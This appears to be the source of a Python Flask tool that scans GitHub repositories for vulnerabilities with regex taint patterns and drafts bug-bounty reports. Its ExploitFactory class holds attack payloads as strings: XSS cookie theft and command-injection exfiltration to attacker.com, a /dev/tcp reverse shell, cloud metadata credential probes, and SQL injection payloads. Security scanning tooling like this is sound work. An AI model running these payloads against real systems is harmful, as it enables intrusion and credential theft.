#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import base64, json, re, requests, os

GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
GH_HEADERS = {'Authorization': 'token ' + GITHUB_TOKEN} if GITHUB_TOKEN else {}

app = Flask(__name__)
CORS(app)

# ══════════════════════════════════════════════
# TAINT SOURCES — every user-controlled input
# ══════════════════════════════════════════════
TAINT_SOURCES = (
    r'(?:req\.(?:params|query|body|cookies|headers|files)|'
    r'searchParams\.get|formData\(|URLSearchParams|'
    r'\$_(?:GET|POST|REQUEST|COOKIE|FILES)|'
    r'request\.(?:args|form|json|values|data|files)|'
    r'params\[|query\[|body\[|ctx\.(?:query|body|params|request))'
)

# ══════════════════════════════════════════════
# GITHUB HELPERS
# ══════════════════════════════════════════════
def gh(url):
    return requests.get(url, headers=GH_HEADERS).json()

def get_file(owner, repo, path):
    r = requests.get(
        'https://api.github.com/repos/' + owner + '/' + repo + '/contents/' + path,
        headers=GH_HEADERS)
    return r.json() if r.status_code == 200 else None

def decode_content(content):
    if isinstance(content, dict) and 'content' in content:
        try:
            return base64.b64decode(content['content']).decode('utf-8', errors='ignore')
        except:
            return ''
    return content if isinstance(content, str) else ''

def get_repo_files(owner, repo):
    # Try recursive tree first
    url = 'https://api.github.com/repos/' + owner + '/' + repo + '/git/trees/HEAD?recursive=1'
    resp = gh(url)

    # If truncated (large monorepo), fetch subtrees manually
    if resp.get('truncated') or 'tree' not in resp:
        all_items = []
        # Get root tree
        root = gh('https://api.github.com/repos/' + owner + '/' + repo + '/git/trees/HEAD')
        if 'tree' not in root:
            return []
        # BFS through directories up to depth 6
        queue = [(item, 0) for item in root['tree']]
        visited = set()
        while queue:
            item, depth = queue.pop(0)
            if depth > 6:
                continue
            if item['type'] == 'blob':
                all_items.append(item)
            elif item['type'] == 'tree' and depth < 6:
                sha = item.get('sha','')
                if sha in visited:
                    continue
                visited.add(sha)
                sub = gh('https://api.github.com/repos/' + owner + '/' + repo + '/git/trees/' + sha)
                if 'tree' in sub:
                    for child in sub['tree']:
                        child['path'] = item['path'] + '/' + child['path']
                        queue.append((child, depth+1))
        resp = {'tree': all_items}

    if 'tree' not in resp:
        return []

    SKIP = [
        'node_modules','dist','build','.git','vendor','__pycache__','coverage',
        '.min.js','.bundle.js','demos','storybook','.stories.',
        'e2e','cypress','migrations','seeds','locales','i18n',
        'public/assets','static/fonts','static/images','static/css',
        'assets/','fonts/','images/','icons/','.svg','.png','.jpg',
        '.gif','.woff','.ttf','.eot','.ico','.mp4','.mp3','.pdf',
        'CHANGELOG','CHANGELOG.md','LICENSE','NOTICE','CONTRIBUTING',
        'package-lock.json','yarn.lock','composer.lock','Gemfile.lock',
        'poetry.lock','go.sum','Cargo.lock',
    ]
    # Test/mock files — keep but flag separately, don't skip entirely
    TEST_MARKERS = ['.spec.','.test.','__tests__','__mocks__','fixtures',
                    '_test.go','_spec.rb','Test.java']

    EXTS = [
        '.js','.ts','.jsx','.tsx','.mjs','.cjs',
        '.py','.php','.go','.rb','.java','.jsp','.kt','.cs',
        '.env','.env.example','.env.local','.env.development',
        '.yml','.yaml','.json','.config','.xml',
        '.htaccess','.conf','.ini','.properties',
        '.erb','.ejs','.hbs','.twig','.blade.php','.phtml',
        '.sh','.bash','.zsh',
    ]

    # Priority dirs — always include if found
    PRIORITY_DIRS = [
        'routes','route','controllers','controller','handlers','handler',
        'middleware','middlewares','auth','authentication','authorization',
        'api','apis','services','service','models','model',
        'src','lib','app','core','internal','server',
        'config','configs','settings',
        'views','templates','helpers','utils','utilities',
        'admin','dashboard','user','users','account','accounts',
        'payment','payments','order','orders','invoice',
    ]

    priority = []
    normal   = []

    for item in resp['tree']:
        p    = item.get('path','')
        plow = p.lower()

        # Hard skip — binary/lock/asset files
        if any(s in plow for s in SKIP):
            continue
        # Must have a source extension or be Dockerfile/.gitignore
        if not (any(plow.endswith(e) for e in EXTS) or p in ['.gitignore','Dockerfile','docker-compose.yml']):
            continue

        is_test = any(m in plow for m in TEST_MARKERS)
        if is_test:
            continue  # Skip test files entirely for cleaner results

        # Prioritise files in security-relevant directories
        parts = plow.split('/')
        if any(d in parts for d in PRIORITY_DIRS) or any(d in plow for d in PRIORITY_DIRS):
            priority.append(p)
        else:
            normal.append(p)

    # Return priority files first, pad with normal up to 200 total
    combined = priority + [f for f in normal if f not in priority]
    return combined[:200]

def categorize_files(files_dict):
    cats = {k:[] for k in ['routes','middleware','auth','config','models',
                            'controllers','uploads','templates','security','other']}
    for path in files_dict:
        p = path.lower()
        if any(x in p for x in ['middleware','middlewares']):         cats['middleware'].append(path)
        elif any(x in p for x in ['auth','login','session','jwt','oauth','passport']): cats['auth'].append(path)
        elif any(x in p for x in ['route','router','routes','api','endpoint']):        cats['routes'].append(path)
        elif any(x in p for x in ['config','setting','env','conf']):  cats['config'].append(path)
        elif any(x in p for x in ['model','schema','entity','dao']):  cats['models'].append(path)
        elif any(x in p for x in ['controller','handler','service']): cats['controllers'].append(path)
        elif any(x in p for x in ['upload','file','storage','media']): cats['uploads'].append(path)
        elif any(x in p for x in ['template','view','layout','partial']): cats['templates'].append(path)
        elif any(x in p for x in ['security','guard','policy','permission','acl','waf','sanitize','validate','escape']): cats['security'].append(path)
        else: cats['other'].append(path)
    return cats

# ══════════════════════════════════════════════
# REPO INTELLIGENCE — cross-file analysis brain
# ══════════════════════════════════════════════
class RepoIntelligence:
    def __init__(self, files_dict, cats):
        self.files     = files_dict
        self.cats      = cats
        self.full_text = '\n'.join(files_dict.values())
        self._build_index()
        self._build_dependency_map()

    def _build_index(self):
        t = self.full_text
        self.has_orm              = bool(re.search(r'(?i)(sequelize|typeorm|prisma|mongoose|sqlalchemy|activerecord|eloquent|hibernate|gorm|knex)', t))
        self.has_csrf             = bool(re.search(r'(?i)(csrf|csurf|_token|csrfToken|csrf_token|SameSite)', t))
        self.has_helmet           = bool(re.search(r'(?i)(helmet|content.security.policy|X-Frame-Options)', t))
        self.has_auth_middleware  = bool(re.search(r'(?i)(app\.use.*auth|router\.use.*auth|requireAuth|isAuthenticated|verifyToken|checkAuth|authenticate|authorize|ensureLoggedIn|passport\.authenticate)', t))
        self.has_rate_limit       = bool(re.search(r'(?i)(rate.limit|rateLimit|throttle|slowDown|express-rate)', t))
        self.has_input_validation = bool(re.search(r'(?i)(joi|yup|validator|express-validator|zod|cerberus|marshmallow|ajv|validate\()', t))
        self.has_parameterized    = bool(re.search(r'(?i)(prepared|parameterized|placeholder|\?\s*,|bindParam|\$\d|:name)', t))
        self.has_escape           = bool(re.search(r'(?i)(escape|sanitize|htmlspecialchars|DOMPurify|xss\(|encode\(|encodeURIComponent)', t))
        self.has_url_allowlist    = bool(re.search(r'(?i)(allowlist|whitelist|allowed_hosts|ALLOWED_HOSTS|allowedDomains|isAllowedUrl|validateHost)', t))
        self.has_file_type_check  = bool(re.search(r'(?i)(mime|mimetype|fileFilter|allowedTypes|getimagesize)', t))
        self.has_htaccess         = bool(re.search(r'(?i)(php_flag engine off|FilesMatch.*Deny|Options -ExecCGI)', t))
        self.has_jwt_verify       = bool(re.search(r'(?i)(jwt\.verify|verify.*secret|PublicKey)', t))
        self.has_https_flag       = bool(re.search(r'(?i)(secure.*true|httpOnly.*true|SameSite.*Strict)', t))
        self.has_ownership_check  = bool(re.search(r'(?i)(req\.user\.id\s*!==?\s*|checkOwner|isOwner|verifyOwnership|assertOwner|Current\.family|current_user\.|current_account\.|policy_scope|authorize!|can\?|belongs_to|scope :)', t))
        self.middleware_auth_routes = re.findall(r'(?i)(?:app|router)\.use\s*\(["\']([^"\']+)["\'].*?(?:auth|jwt|token|session)', t)

    def _build_dependency_map(self):
        """Build a map of which files are 'dirty' (sources) vs 'dangerous' (sinks)."""
        self.dirty_files     = {}   # file → count of taint sources
        self.dangerous_files = {}   # file → count of dangerous sinks
        SINK_PATTERN = re.compile(
            r'(?i)(?:eval\s*\(|exec\s*\(|system\s*\(|fetch\s*\(|axios\s*[.(]|'
            r'\.query\s*\(|\.execute\s*\(|innerHTML\s*=|dangerouslySetInnerHTML|'
            r'res\.redirect\s*\(|render\s*\(|spawn\s*\(|pickle\.loads|unserialize\s*\()', re.I)
        SOURCE_PATTERN = re.compile(TAINT_SOURCES)

        SKIP_DEP = ['.json','.md','.txt','.gitignore','.eslintignore','.prettierrc',
                    '.vscode','settings.json','package.json','yarn.lock','tsconfig']
        for path, content in self.files.items():
            if self.is_test_file(path):
                continue
            if any(s in path.lower() for s in SKIP_DEP):
                continue
            src_count  = len(SOURCE_PATTERN.findall(content))
            sink_count = len(SINK_PATTERN.findall(content))
            if src_count  > 0: self.dirty_files[path]     = src_count
            if sink_count > 0: self.dangerous_files[path] = sink_count

    # ── Variable follower: cross-line taint tracking ──
    def follow_variable(self, var_name, file_content):
        """
        Given a variable name, checks if it is:
        1. Assigned from a taint source in this file
        2. Later used in a dangerous sink in this file
        Returns (is_tainted, source_line, sink_line)
        """
        if not var_name or len(var_name) < 2:
            return False, None, None

        lines = file_content.split('\n')
        assign_pattern = re.compile(
            r'(?:const|let|var|auto)\s+' + re.escape(var_name) + r'\s*=\s*([^;\n]{3,120})')
        sink_pattern = re.compile(
            r'(?i)(?:fetch|axios|eval|exec|system|query|execute|innerHTML|'
            r'redirect|render|spawn|dangerouslySetInnerHTML|'
            r'subprocess|os\.system|child_process)\s*[\(\.].*\b' + re.escape(var_name) + r'\b')

        assign_line = None
        assign_src  = None
        for i, line in enumerate(lines, 1):
            m = assign_pattern.search(line)
            if m and re.search(TAINT_SOURCES, m.group(1)):
                assign_line = i
                assign_src  = m.group(1).strip()[:80]
                break

        if not assign_line:
            return False, None, None

        # Now look for the variable being passed to a sink after assignment
        for i, line in enumerate(lines, 1):
            if i <= assign_line:
                continue
            if sink_pattern.search(line):
                return True, assign_src, i

        return False, assign_src, None

    # ── Cross-file taint trace ──
    def find_variable_assignment(self, var_name):
        if not var_name or len(var_name) < 2:
            return False, None
        pattern = re.compile(
            r'(?:const|let|var)\s+' + re.escape(var_name) + r'\s*=\s*([^;\n]{3,120})')
        for m in pattern.finditer(self.full_text):
            val = m.group(1)
            if re.search(TAINT_SOURCES, val):
                return True, val.strip()[:80]
        return False, None

    # ── Logic flow: check if ownership/auth is enforced near a finding ──
    def has_ownership_check_near(self, snippet, context_window=400):
        """Returns True if ownership/auth check found near the snippet."""
        idx = self.full_text.find(snippet[:60])
        if idx == -1:
            return False
        window = self.full_text[max(0, idx-context_window):idx+context_window]
        checks = [
            r'req\.user\.id\s*!==?\s*',
            r'checkOwner', r'isOwner', r'verifyOwnership', r'assertOwner',
            r'userId\s*===?\s*req\.user',
            r'if\s*\(.*user.*id.*!==',
            r'authorize\s*\(', r'can\s*\(.*user',
        ]
        return any(re.search(c, window, re.I) for c in checks)

    def route_has_auth(self, route_snippet):
        m = re.search(r'["\']([/\w:]+)["\']', route_snippet)
        if not m:
            return False
        route = m.group(1)
        for mw in self.middleware_auth_routes:
            if route.startswith(mw) or mw in route:
                return True
        return bool(re.search(r'(?i)(requireAuth|isAuthenticated|verifyToken|checkAuth|passport\.authenticate|authorize)', route_snippet))

    def check_ssrf_mitigation(self):
        return self.has_url_allowlist or bool(re.search(r'(?i)(block.*169\.254|block.*localhost|url.*filter|isAllowedUrl|validateHost)', self.full_text))

    def check_xss_mitigation(self):
        return self.has_escape or self.has_helmet

    def check_sqli_mitigation(self):
        return self.has_orm or self.has_parameterized

    def is_test_file(self, path):
        p = path.lower()
        return any(x in p for x in ['.test.','.spec.','__test','__mock','fixture','/test/','/spec/','/mock/','_test.','_spec.'])

    def is_protected_path(self, path):
        p = path.lower()
        return any(x in p for x in ['admin','api/private','dashboard','settings','internal','secure'])

    def get_top_dirty(self, n=5):
        return sorted(self.dirty_files.items(), key=lambda x: x[1], reverse=True)[:n]

    def get_top_dangerous(self, n=5):
        return sorted(self.dangerous_files.items(), key=lambda x: x[1], reverse=True)[:n]

# ══════════════════════════════════════════════
# EXPLOIT FACTORY — generates PoC & repro steps
# ══════════════════════════════════════════════
class ExploitFactory:
    @staticmethod
    def generate_repro_steps(vuln_type, snippet, file_path, line):
        fname = (file_path or 'unknown').split('/')[-1]

        if vuln_type == 'IDOR':
            return [
                "Phase 1 — Baseline: Authenticate as User A. Record their resource ID from the response.",
                "Phase 2 — IDOR Attempt: Replace the ID with User B's ID (try ID+1, ID-1, known IDs).",
                "         Request: GET /api/<resource>/<USER_B_ID>  Authorization: Bearer <USER_A_TOKEN>",
                "Phase 3 — Method Tampering: Try PUT/POST/PATCH with the same ID bypass.",
                "Phase 4 — Parameter Pollution: /api/resource?id=USER_A_ID&id=USER_B_ID",
                "Phase 5 — Auth Header Removal: Remove the Authorization header entirely.",
                "Phase 6 — Check: Does the response contain User B's data? If yes → CONFIRMED IDOR.",
                "File: " + fname + " | Line: " + str(line),
            ]
        elif vuln_type == 'SSRF':
            return [
                "Phase 1 — Internal Probe: Set URL param to http://127.0.0.1:80/",
                "Phase 2 — AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "Phase 3 — GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'",
                "Phase 4 — DNS Rebinding: Use https://rbndr.us to bypass IP allowlists.",
                "Phase 5 — Protocol Smuggling: Try file:///etc/passwd, dict://, gopher:// if curl-based.",
                "Phase 6 — Blind SSRF: Point to Burp Collaborator / interactsh to confirm OOB connection.",
                "Snippet: " + snippet[:80],
            ]
        elif vuln_type == 'SQL_INJECTION':
            return [
                "Phase 1 — Error Detection: Append ' to input → watch for SQL error in response.",
                "Phase 2 — Boolean Inference: ' OR '1'='1 vs ' OR '1'='2 → check response difference.",
                "Phase 3 — Time-Based Blind: ' OR SLEEP(5)-- (MySQL) / ' OR pg_sleep(5)-- (Postgres)",
                "Phase 4 — UNION-Based: ' UNION SELECT NULL,NULL,NULL-- (increment NULLs until no error)",
                "Phase 5 — Data Extraction: ' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "Phase 6 — Automate: sqlmap -u 'TARGET_URL' --data='PARAM=*' --level=3 --risk=2",
                "File: " + fname + " | Line: " + str(line),
            ]
        elif vuln_type == 'XSS':
            return [
                "Phase 1 — Reflection Test: Input <b>test</b> and check if it renders as bold.",
                "Phase 2 — Basic Payload: <script>alert(document.domain)</script>",
                "Phase 3 — Filter Bypass: <img src=x onerror=alert(1)> or <svg/onload=alert(1)>",
                "Phase 4 — Cookie Theft: <script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                "Phase 5 — Stored XSS Check: Submit payload in profile/comment → log in as admin → check if fires.",
                "Phase 6 — Impact Escalation: Chain with CSRF to perform admin actions.",
            ]
        elif vuln_type == 'RCE':
            return [
                "Phase 1 — Command Separator: Append ; id or | id to input and look for user output.",
                "Phase 2 — Blind RCE: ; sleep 5 → check response time increase.",
                "Phase 3 — OOB Exfil: ; curl https://attacker.com/$(whoami)",
                "Phase 4 — File Write: ; echo 'pwned' > /tmp/rce_proof.txt",
                "Phase 5 — Reverse Shell (if authorized): ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "File: " + fname + " | Line: " + str(line),
            ]
        elif vuln_type == 'SSRF':
            return ["See SSRF steps above."]
        else:
            return [
                "Phase 1 — Identify the input vector from the snippet: " + snippet[:80],
                "Phase 2 — Craft a minimal proof-of-concept payload targeting " + vuln_type,
                "Phase 3 — Verify response difference (error, timing, data leak).",
                "Phase 4 — Document request/response pair for the report.",
                "File: " + fname + " | Line: " + str(line),
            ]

    @staticmethod
    def generate_curl(vuln_type, snippet, file_path):
        base = "curl -i -X GET 'https://TARGET_URL/api/ENDPOINT'"
        if vuln_type == 'IDOR':
            return base + " -H 'Authorization: Bearer VICTIM_TOKEN' # Replace ENDPOINT with /{OTHER_USER_ID}"
        elif vuln_type == 'SSRF':
            return "curl -i -X POST 'https://TARGET_URL/api/ENDPOINT' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}' -H 'Content-Type: application/json'"
        elif vuln_type == 'SQL_INJECTION':
            return "curl -i -X GET \"https://TARGET_URL/api/ENDPOINT?param=' OR SLEEP(5)--\" -H 'Authorization: Bearer YOUR_TOKEN'"
        elif vuln_type == 'XSS':
            return "curl -i -X POST 'https://TARGET_URL/api/ENDPOINT' -d '{\"input\":\"<script>alert(document.domain)</script>\"}' -H 'Content-Type: application/json'"
        elif vuln_type == 'RCE':
            return "curl -i -X POST 'https://TARGET_URL/api/ENDPOINT' -d '{\"cmd\":\"id\"}' -H 'Content-Type: application/json'"
        elif vuln_type == 'AUTH':
            return "curl -i -X POST 'https://TARGET_URL/api/ENDPOINT' -d '{\"isAdmin\":true,\"role\":\"admin\"}' -H 'Content-Type: application/json' -H 'Authorization: Bearer LOW_PRIV_TOKEN'"
        else:
            return base + " -H 'Authorization: Bearer YOUR_TOKEN' # Adapt to " + vuln_type

    @staticmethod
    def generate_markdown_report(vuln, repo_name):
        taint_chain = ''
        if vuln.get('mitigations'):
            for m in vuln['mitigations']:
                if 'TAINT' in m or 'Variable' in m or 'assigned' in m:
                    taint_chain = '\n**Taint Chain:** ' + m
                    break

        steps = '\n'.join('- ' + s for s in (vuln.get('repro_steps') or ['Manual verification required']))
        return (
            "## " + vuln['title'] + "\n\n"
            "**Repository:** " + repo_name + "  \n"
            "**Severity:** " + vuln['severity'] + "  \n"
            "**Confidence:** " + vuln.get('confidence_label', vuln.get('confidence', '')) + "  \n"
            "**File:** " + (vuln.get('file') or 'unknown') + " (line " + str(vuln.get('line','?')) + ")  \n\n"
            "### Description\n"
            "A **" + vuln['title'] + "** was identified in `" + (vuln.get('file') or 'the codebase') + "`. "
            "User-controlled input flows into a dangerous sink without adequate sanitization or authorization checks.\n"
            + taint_chain + "\n\n"
            "### Vulnerable Code\n"
            "```\n" + vuln.get('description','').replace('Found: `','').rstrip('`') + "\n```\n\n"
            "### Impact\n"
            + vuln.get('impact','') + "\n\n"
            "### Reproduction Steps\n"
            + steps + "\n\n"
            "**Test Command:**\n"
            "```bash\n" + (vuln.get('sandbox_curl') or 'See repro steps above') + "\n```\n\n"
            "### Recommended Fix\n"
            + vuln.get('recommendation','') + "\n\n"
            "---\n*Generated by RepoAudit Intelligence Engine v2*"
        )

# ══════════════════════════════════════════════
# VULN CHECKS — taint-aware, chained patterns
# ══════════════════════════════════════════════
VULN_CHECKS = [
    # ── RCE ──
    ('CRITICAL','RCE: User Input Reaches eval/exec','RCE',
     r'(?i)(?:eval\s*\(|`[^`]*#\{'+TAINT_SOURCES+r'|system\s*\(|spawn\s*\(|shell_exec\s*\(|child_process\.exec\s*\()\s*[^)]*'+TAINT_SOURCES),
    ('CRITICAL','SSTI: User Input in Template Render','RCE',
     r'(?i)(?:renderString|renderFile|renderTemplate|nunjucks\.render|ejs\.render|pug\.render|handlebars\.compile)\s*\(\s*.*'+TAINT_SOURCES),
    ('CRITICAL','PHP RCE via User Input','RCE',
     r'(?i)(?:eval|system|exec|passthru|shell_exec)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'),
    ('CRITICAL','PHP File Inclusion via User Input','FILE_INCLUSION',
     r'(?i)(?:include|require)(?:_once)?\s*\(\s*\$_(?:GET|POST|REQUEST)'),

    # ── SSRF ──
    ('CRITICAL','SSRF: User-Controlled URL in Network Request','SSRF',
     r'(?i)(?:fetch|axios\.get|axios\.post|axios\(|requests\.get|requests\.post|http\.get|http\.request|got\(|needle\.get|curl_exec|urllib\.request)\s*\(\s*[^)]*'+TAINT_SOURCES),
    ('CRITICAL','SSRF: AWS Metadata Endpoint','SSRF',
     r'169\.254\.169\.254'),
    ('HIGH','SSRF: Webhook/Callback URL from User Input','SSRF',
     r'(?i)(?:webhook|callback|redirect_url|return_url|next|destination)\s*[=:]\s*[^;,\n]*'+TAINT_SOURCES),

    # ── SQL Injection ──
    ('CRITICAL','SQLi: User Input in Raw SQL Concatenation','SQL_INJECTION',
     r'(?i)(?:execute|query|raw|where|db\.run|cursor\.execute)\s*\(\s*["\'][^"\']*["\'\s]*\+\s*'+TAINT_SOURCES),
    ('CRITICAL','SQLi: Template Literal with User Input','SQL_INJECTION',
     r'(?i)(?:execute|query|raw|db\.run)\s*\(\s*`[^`]*\$\{[^}]*(?:req\.|params|query|body)'),
    ('HIGH','Java SQLi: PrepareStatement Concatenation','SQL_INJECTION',
     r'(?i)(?:prepareStatement|createQuery|createNativeQuery)\s*\([^)]*[\'"]\s*\+'),

    # ── IDOR / Access Control ──
    ('CRITICAL','IDOR: Direct Object Reference Without Ownership Check','IDOR',
     r'(?i)(?:findById|findOne|where|getById|find_by_id)\s*\(\s*[^)]*'+TAINT_SOURCES+r'(?!.*req\.user\.id)'),
    ('HIGH','IDOR: Unprotected Route with ID Parameter','IDOR',
     r'(?i)(?:app\.|router\.)(?:get|post|put|delete|patch)\s*\(["\'].*/:(?:id|userId|accountId|orderId)["\']'),
    ('HIGH','Spring: @RequestMapping Without @PreAuthorize','IDOR',
     r'@(?:GetMapping|PostMapping|PutMapping|DeleteMapping|RequestMapping)\b(?!.*PreAuthorize)'),

    # ── Mass Assignment ──
    ('HIGH','Mass Assignment: Model Created Directly from User Input','INJECTION',
     r'(?i)(?:User|Account|Profile|Admin|Role)\.(?:create|update|build|new)\s*\(\s*'+TAINT_SOURCES),
    ('HIGH','Mass Assignment: req.body Spread Into Model','INJECTION',
     r'(?i)(?:Object\.assign|\.update\(|\.create\()\s*\(\s*[^)]*(?:req\.body|\.\.\.\s*req\.body)'),

    # ── XSS ──
    ('HIGH','XSS: dangerouslySetInnerHTML with User Input','XSS',
     r'dangerouslySetInnerHTML\s*=\s*\{\{\s*__html:\s*[^}]*'+TAINT_SOURCES),
    ('HIGH','XSS: innerHTML/document.write with User Input','XSS',
     r'(?i)(?:innerHTML|outerHTML|document\.write)\s*[+]?=\s*[^;]*'+TAINT_SOURCES),
    ('HIGH','XSS: PHP echo User Input Directly','XSS',
     r'(?i)echo\s+\$_(?:GET|POST|REQUEST|COOKIE)'),
    ('HIGH','XSS: res.send with Unsanitized Input','XSS',
     r'(?i)res\.(?:send|write|end)\s*\(\s*[^)]*'+TAINT_SOURCES),

    # ── Prototype Pollution ──
    ('HIGH','Prototype Pollution: Unsafe Merge with User Input','INJECTION',
     r'(?i)(?:Object\.assign\(|_\.merge\(|deepmerge\()\s*[^)]*'+TAINT_SOURCES),
    ('HIGH','Prototype Pollution: __proto__ Assignment','INJECTION',
     r'(?i)(?:__proto__|constructor\[.*\]|prototype\[.*\])\s*[=]'),

    # ── Auth / JWT ──
    ('CRITICAL','Auth Bypass: isAdmin/Role Trusted from Request Body','AUTH',
     r'(?i)if\s*\(\s*(?:'+TAINT_SOURCES+r')\.(?:isAdmin|role|permissions|admin|is_admin|is_superuser)\s*(?:===?|!==?|==)'),
    ('HIGH','Unvalidated Redirect: User-Controlled Location Header','AUTH',
     r'(?i)(?:res\.redirect|location\.href|res\.header\s*\(\s*["\']Location)\s*[^;,\n]*'+TAINT_SOURCES),
    ('HIGH','JWT: decode() Without verify()','JWT',
     r'(?i)jwt\.decode\s*\((?!.*verify)'),
    ('HIGH','JWT: Algorithm "none" Allowed','JWT',
     r'(?i)algorithms\s*:\s*\[\s*["\']none["\']\s*\]'),
    ('HIGH','JWT: Weak Hardcoded Secret','JWT',
     r'(?i)(?:jwt\.sign|jwt_encode)\s*\(.*["\'](?:secret|password|123|key|test|changeme)["\']'),
    ('HIGH','OAuth: redirect_uri from User Input','AUTH',
     r'(?i)redirect_uri\s*[=:]\s*[^;,\n]*'+TAINT_SOURCES),

    # ── Business Logic ──
    ('HIGH','Race Condition: Financial Update Without Lock','RACE_CONDITION',
     r'(?i)(?:balance|credit|points|tokens|coins|amount)\s*[+-]='),
    ('HIGH','Business Logic: Price/Amount from User Input','BUSINESS_LOGIC',
     r'(?i)(?:price|amount|total|cost|fee|quantity)\s*=\s*[^;,\n]*'+TAINT_SOURCES),
    ('HIGH','Business Logic: Coupon/Discount from User Input','BUSINESS_LOGIC',
     r'(?i)(?:coupon|discount|promo|voucher)\s*=\s*[^;,\n]*'+TAINT_SOURCES),

    # ── Injection ──
    ('HIGH','NoSQL Injection: MongoDB Operator in User Input','NOSQL_INJECTION',
     r'(?i)(?:find|findOne|aggregate|updateOne)\s*\(\s*\{[^}]*'+TAINT_SOURCES),
    ('HIGH','Command Injection: User Input in Shell Command','COMMAND_INJECTION',
     r'(?i)(?:os\.system|subprocess\.call|subprocess\.Popen|child_process\.exec|execSync)\s*\([^)]*'+TAINT_SOURCES),
    ('HIGH','Insecure Deserialization','DESERIALIZATION',
     r'(?i)(?:pickle\.loads|yaml\.load\s*\(|unserialize\s*\(|marshal\.loads|ObjectInputStream)'),
    ('HIGH','LDAP Injection: User Input in LDAP Query','LDAP',
     r'(?i)(?:ldap_search|ldap\.search|ldap\.query)\s*\([^)]*'+TAINT_SOURCES),
    ('HIGH','XXE: Unsafe XML Parser Configuration','XXE',
     r'(?i)(?:libxml_disable_entity_loader\s*\(\s*false|LIBXML_NOENT|DocumentBuilderFactory|SAXParserFactory)'),

    # ── Java ──
    ('HIGH','Java Deserialization: ObjectInputStream.readObject','DESERIALIZATION',
     r'(?i)(?:ObjectInputStream|readObject|fromXML)\s*\('),
    ('HIGH','Java Path Traversal: File from Request Parameter','IDOR',
     r'(?i)(?:new File|Paths\.get|FileInputStream)\s*\([^)]*getParameter'),

    # ── Secrets ──
    ('CRITICAL','Hardcoded Password in Source','HARDCODED_SECRET',
     r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{4,}["\']'),
    ('CRITICAL','Hardcoded API Key/Secret','HARDCODED_SECRET',
     r'(?i)(?:api_key|apikey|secret_key|auth_token|access_token)\s*[=:]\s*["\'][^"\']{8,}["\']'),
    ('CRITICAL','AWS Access Key Exposed','HARDCODED_SECRET',
     r'AKIA[0-9A-Z]{16}'),
    ('CRITICAL','Private Key Material in Source','HARDCODED_SECRET',
     r'-----BEGIN (?:RSA|EC|DSA|OPENSSH|PGP) PRIVATE KEY'),
    ('CRITICAL','Hardcoded DB URL with Credentials','HARDCODED_SECRET',
     r'(?i)(?:mongodb|mysql|postgres|postgresql)://[^:]+:[^@]{3,}@'),

    # ── Misconfig ──
    ('MEDIUM','Debug Mode Enabled','MISCONFIG',
     r'(?i)(?:DEBUG\s*=\s*True|debug\s*=\s*true|APP_DEBUG\s*=\s*true|app\.run.*debug\s*=\s*True)'),
    ('MEDIUM','CORS Wildcard Origin','MISCONFIG',
     r'(?i)(?:Access-Control-Allow-Origin:\s*\*|origin:\s*["\']?\*)'),
    ('MEDIUM','CORS: Reflected Origin from Request','MISCONFIG',
     r'(?i)Access-Control-Allow-Origin["\'],\s*'+TAINT_SOURCES),
    ('MEDIUM','Weak Crypto: MD5/SHA1','WEAK_CRYPTO',
     r'(?i)\b(?:md5|sha1)\s*\('),
    ('MEDIUM','Shell=True in Subprocess','COMMAND_INJECTION',
     r'shell\s*=\s*True'),
    ('MEDIUM','PHP mysql_* Deprecated Functions','SQL_INJECTION',
     r'(?i)(?:mysql_query|mysql_connect|mysql_real_escape_string)\s*\('),
    ('MEDIUM','Stack Trace Exposed to User','MISCONFIG',
     r'(?i)(?:printStackTrace\s*\(\s*\)|traceback\.print_exc)'),
    ('MEDIUM','Missing CSRF on State-Changing Route','CSRF',
     r'(?i)app\.(?:post|put|delete|patch)\s*\(["\'][^"\']+["\']'),
    ('LOW','Sensitive Data Logged','INFO_EXPOSURE',
     r'(?i)(?:console\.log|print\s*\(|logger\.(?:info|debug|log))\s*\([^)]*(?:password|token|secret|key)'),
    ('LOW','Security TODO/FIXME in Code','TODO',
     r'(?i)(?://[ \t]|#[ \t])\s*(?:TODO|FIXME|HACK).{0,40}(?:auth|security|password|token|vuln|bypass)'),
    ('LOW','Cookie Without Secure/HttpOnly','MISCONFIG',
     r'(?i)(?:res\.cookie|Set-Cookie:)(?!.*(?:secure|httpOnly|HttpOnly))'),
    ('INFO','.env File Referenced','INFO', r'\.env'),
    ('INFO','Docker Port Exposed','INFO',  r'EXPOSE\s+\d+'),
    ('INFO','Root User in Docker','INFO',  r'USER root'),
    ('INFO','Permissive chmod 777','INFO', r'chmod\s+(?:777|0777|a\+rwx)'),
]

INLINE_SANITIZERS = {
    'SQL_INJECTION':    [r'params:', r'bind:', r'prepare\s*\(', r'int\s*\(', r'Number\s*\(', r'parseInt\s*\(', r'escape\s*\('],
    'XSS':              [r'DOMPurify', r'escape\s*\(', r'sanitize\s*\(', r'encodeURI'],
    'SSRF':             [r'isAllowedUrl', r'validateHost', r'allowlist', r'whitelist'],
    'AUTH':             [r'auth\s*\(', r'isAuthenticated', r'verifyToken', r'checkPermission'],
    'COMMAND_INJECTION':[r'shlex\.quote', r'escapeshellarg', r'escapeShell'],
}

CONFIDENCE_DISPLAY = {
    'ULTRA_CONFIRMED': ('⚡ ULTRA-CONFIRMED',         '#ff0000'),
    'CONFIRMED':       ('CONFIRMED BUG',               '#ff3b3b'),
    'LIKELY':          ('LIKELY VULNERABLE',            '#ff8c42'),
    'POSSIBLE':        ('POSSIBLE - Verify Manually',   '#ffd166'),
    'INFORMATIONAL':   ('TEST/MOCK FILE',               '#8ecae6'),
    'MITIGATED':       ('MITIGATED - Protected',        '#06d6a0'),
}

PAYOUT_ESTIMATES = {
    'RCE':             '$5,000 – $100,000+',
    'SSRF':            '$1,000 – $15,000',
    'SQL_INJECTION':   '$1,000 – $10,000',
    'XSS':             '$500 – $5,000',
    'IDOR':            '$500 – $10,000',
    'INJECTION':       '$500 – $5,000',
    'AUTH':            '$1,000 – $15,000',
    'JWT':             '$500 – $5,000',
    'HARDCODED_SECRET':'$200 – $2,000',
